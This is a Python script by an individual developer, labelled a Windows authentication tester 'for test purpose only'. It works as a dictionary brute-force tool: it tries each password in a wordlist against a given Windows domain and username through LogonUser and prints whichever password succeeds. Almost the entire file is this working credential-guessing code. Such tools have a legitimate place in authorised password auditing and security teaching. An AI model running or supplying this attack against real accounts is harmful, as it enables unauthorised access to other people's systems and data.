# !/usr/bin/python
# coding: latin-1

#------------------------------------------------------------------------------#
# Security - Windows Authentication Tester                                     #
# ============================================================================ #
# Note:         To be used for test purpose only                               #
# Developer:    Chavaillaz Johan                                               #
# Filename:     WindowsAuthenticationTester.py                                 #
# Version:      1.0                                                            #
#                                                                              #
# Licensed to the Apache Software Foundation (ASF) under one                   #
# or more contributor license agreements. See the NOTICE file                  #
# distributed with this work for additional information                        #
# regarding copyright ownership. The ASF licenses this file                    #
# to you under the Apache License, Version 2.0 (the                            #
# "License"); you may not use this file except in compliance                   #
# with the License. You may obtain a copy of the License at                    #
#                                                                              #
# http://www.apache.org/licenses/LICENSE-2.0                                   #
#                                                                              #
# Unless required by applicable law or agreed to in writing,                   #
# software distributed under the License is distributed on an                  #
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY                       #
# KIND, either express or implied. See the License for the                     #
# specific language governing permissions and limitations                      #
# under the License.                                                           #
#                                                                              #
#------------------------------------------------------------------------------#

#------------------------------------------------------------------------------#
#                                                                              #
#                               LIBRARIES IMPORT                               #
#                                                                              #
#------------------------------------------------------------------------------#

import sys
import getpass
import win32security # Dependency, see README
import argparse

#------------------------------------------------------------------------------#
#                                                                              #
#                             UTILITIES FUNCTIONS                              #
#                                                                              #
#------------------------------------------------------------------------------#

def checkAuthentication(domain, username, password):
	"""
	Test authentication in windows
	
	:param domain: Domain in which test
	:type domain: str
	:param username: Account username to test
	:type username: str
	:param password: Account password to test
	:type password: str
	"""
	try:
		hUser = win32security.LogonUser (
			username,
			domain,
			password,
			win32security.LOGON32_LOGON_NETWORK,
			win32security.LOGON32_PROVIDER_DEFAULT
		)
	except win32security.error:
		return False
	else:
		return True

def bruteForce(domain, username, dictionary):
	"""
	Authentication test for each password in the dictionary
	with the given user name and domain
	
	:param domain: Domain in which test authentication (generally computer name)
	:type domain: str
	:param username: Username used to test each password in given dictionary file
	:type username: str
	:param dictionary: Dictionary file path that contains all password
	:type dictionary: str
	"""
	# Open dictionary file
	with open(dictionary) as file:
		# Read each line : One line = One password
		for line in file:
			# Delete new line character
			password = line.rstrip('\n')
			# Check authentication
			if checkAuthentication(domain, username, password):
				return password
	
	return False

#------------------------------------------------------------------------------#
#                                                                              #
#                               "MAIN" FUNCTION                                #
#                                                                              #
#------------------------------------------------------------------------------#

# If this is the main module, run this
if __name__ == '__main__':
	argsCount = len(sys.argv)
	argsIndex = 1
	
	# Create argument parser to help user
	parser = argparse.ArgumentParser(
		description='Test user authentication with a given dictionary.'
	)
	parser.add_argument(
		'domain', 
		type=str,
		help='Domain in which test authentication. Generally computer name.'
	)
	parser.add_argument(
		'username', 
		type=str,
		help='Username used to test each password in given dictionary file.'
	)
	parser.add_argument(
		'dictionary', 
		type=str,
		help='Dictionary file path that contains all password to test.'
	)
	
	# Show help if one of the arguments is missing
	if argsCount != 4:
		parser.print_help()
		sys.exit()
	
	# User, domain and dictionary file in scripts arguments
	domain = sys.argv[1]
	username = sys.argv[2]
	dictionary = sys.argv[3]
	
	# Launch script
	password = bruteForce(domain, username, dictionary)
	
	if not password:
		print("Password not found in dictionary")
	else:
		print("Password found : " + password)
		
